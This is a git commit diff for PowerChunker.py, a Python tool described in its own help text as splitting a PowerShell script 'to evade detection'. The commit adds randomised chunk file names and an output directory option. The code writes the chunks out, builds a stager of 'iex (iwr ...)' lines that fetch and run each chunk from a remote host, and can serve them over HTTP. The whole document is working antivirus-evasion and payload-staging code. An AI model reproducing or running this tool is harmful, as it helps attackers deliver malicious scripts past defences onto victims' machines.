efa3436e34b81a610dcf007d7c7486e7fa3f3675
Mayk <7395296+yok4i@users.noreply.github.com>
2022-04-26 12:20:49 -0300

    Add option to randomize file names
    Add option to set output directory
    
    Let user define protocol to be used

--- PowerChunker.py
+++ PowerChunker.py
@@ -1,8 +1,10 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 import http.server
 import socketserver
 import argparse
 import sys
+import secrets
+import string
 
 inspiration = """
 /\\     __    PowerChunker.py!!!            
@@ -19,73 +21,133 @@ inspiration = """
                      `--._.-'                                                           
 """
 
-def main(filename, host, stagername, serve):
-	f = open(filename, 'r')
-	sample = f.readlines()
-	f.close()
 
-	real = []
-	multiline = False
-
-	count = 1
-	for line in sample:
-		#line = line.strip("\n")
-		if "@\"" in line:
-			multiline = True
-		if "\"@" in line:
-			real.append(line)
-			multiline = False
-			done = ''.join(real)
-			f = open('{}.ps1'.format(count), 'w+')
-			f.write(done)
-			f.close()
-			count += 1
-		if multiline == True:
-			real.append(line)
-		if multiline == False:
-			if "\"@" not in line:
-				f = open('{}.ps1'.format(count), 'w+')
-				f.write(line)
-				f.close()
-				count += 1
-
-	print("[+] Powershell script has been split into {} files...".format(count-1))
-
-	stager = []
-	for x in range(1, count):
-		stager.append("iex (iwr -UseBasicParsing http://{}/{}.ps1)\n".format(host, x))
+def generate_name(alphabet, length=12, exclude=None):
+    if exclude is None:
+        exclude = []
+    name = "".join(secrets.choice(alphabet) for i in range(length))
+    while name in exclude:
+        name = "".join(secrets.choice(alphabet) for i in range(length))
+    return name
 
 
-	f = open(stagername, 'w+')
-	f.write(''.join(stager))
-	f.close()
+def main(filename, host, outdir, stagername, serve, randomize):
+    alphabet = string.ascii_letters + string.digits
+    f = open(filename, "r")
+    sample = f.readlines()
+    f.close()
 
-	print("[!] PowerChunker Stager written to: {}\n    Execute like so: iex (iwr -UseBasicParsing http://{}/{})".format(stagername, host, stagername))
+    real = []
+    multiline = False
 
-	if serve is True:
-		PORT = 80
-		Handler = http.server.SimpleHTTPRequestHandler
-		with socketserver.TCPServer(("", PORT), Handler) as httpd:
-		    print("[+] Serving at port:", PORT)
-		    httpd.serve_forever()
+    count = 1
+    names = []
+    for line in sample:
+        # line = line.strip("\n")
+        if '@"' in line:
+            multiline = True
+        if '"@' in line:
+            real.append(line)
+            multiline = False
+            done = "".join(real)
+            if randomize:
+                name = generate_name(alphabet=alphabet, exclude=names)
+                names.append(name)
+            else:
+                name = count
+            with open("{}{}.ps1".format(outdir, name), "w+") as f:
+                f.write(done)     
+            count += 1
+        if multiline == True:
+            real.append(line)
+        if multiline == False:
+            if '"@' not in line:
+                if randomize:
+                    name = generate_name(alphabet=alphabet, exclude=names)
+                    names.append(name)
+                else:
+                    name = count
+                with open("{}{}.ps1".format(outdir, name), "w+") as f:
+                    f.write(line)
+                count += 1
+
+    print("[+] Powershell script has been split into {} files...".format(count - 1))
+
+    stager = []
+    for x in names if randomize else range(1, count):
+        stager.append("iex (iwr -UseBasicParsing {}/{}.ps1)\n".format(host, x))
+
+    with open("{}{}".format(outdir, stagername), "w+") as f:
+        f.write("".join(stager))
+
+    print(
+        "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing {}/{})".format(
+            outdir, stagername, host, stagername
+        )
+    )
+
+    if serve is True:
+        PORT = 80
+        Handler = http.server.SimpleHTTPRequestHandler
+        with socketserver.TCPServer(("", PORT), Handler) as httpd:
+            print("[+] Serving at port:", PORT)
+            httpd.serve_forever()
+
 
 print(inspiration)
-parser = argparse.ArgumentParser(description='Split a powershell script to evade detection!')
+parser = argparse.ArgumentParser(
+    description="Split a powershell script to evade detection!"
+)
 parser.add_argument("file", help="Name of powershell script to chunk", type=str)
-parser.add_argument("host", help="Domain Name or IP Address of host that will serve stager", type=str)
-parser.add_argument('-s','--serve', dest='serve', help='Start HTTP Server to host stager (Optional)', default=False, action='store_true')
-parser.add_argument('-o', '--out', dest='out', help='Name of final stager (Optional)', metavar='stager.ps1', default='chunker.ps1')
+parser.add_argument(
+    "host",
+    help="Domain Name or IP Address of host that will serve stager, with scheme",
+    type=str,
+)
+parser.add_argument(
+    "-d",
+    "--dir",
+    dest="dir",
+    help="Directory to write results to (Optional)",
+    default="./",
+)
+parser.add_argument(
+    "-s",
+    "--serve",
+    dest="serve",
+    help="Start HTTP Server to host stager (Optional)",
+    default=False,
+    action="store_true",
+)
+parser.add_argument(
+    "-o",
+    "--out",
+    dest="out",
+    help="Name of final stager (Optional)",
+    metavar="stager.ps1",
+    default="chunker.ps1",
+)
+parser.add_argument(
+    "-r",
+    "--random",
+    dest="random",
+    help="Randomize output filenames (except final stager)",
+    action="store_true",
+)
 if len(sys.argv) < 3:
-	parser.print_help()
-	sys.exit()
+    parser.print_help()
+    sys.exit()
 args = parser.parse_args()
-try:	
-		if len(sys.argv) > 3:
-			if args.file is None or args.host is None or args.serve is None:
-					raise exception()
-			else:
-				main(args.file, args.host, args.out, args.serve)
-		else:
-			main(args.file, args.host, args.out, args.serve)
+if not args.dir.endswith("/"):
+    args.dir += "/"
+assert args.host.startswith("http"), "Host must contain scheme  (like http://)"
+try:
+    if len(sys.argv) > 3:
+        if args.file is None or args.host is None or args.serve is None:
+            raise Exception()
+        else:
+            main(args.file, args.host, args.dir, args.out, args.serve, args.random)
+    else:
+        main(args.file, args.host, args.dir, args.out, args.serve, args.random)
 except:
-        sys.exit()
+    sys.exit()
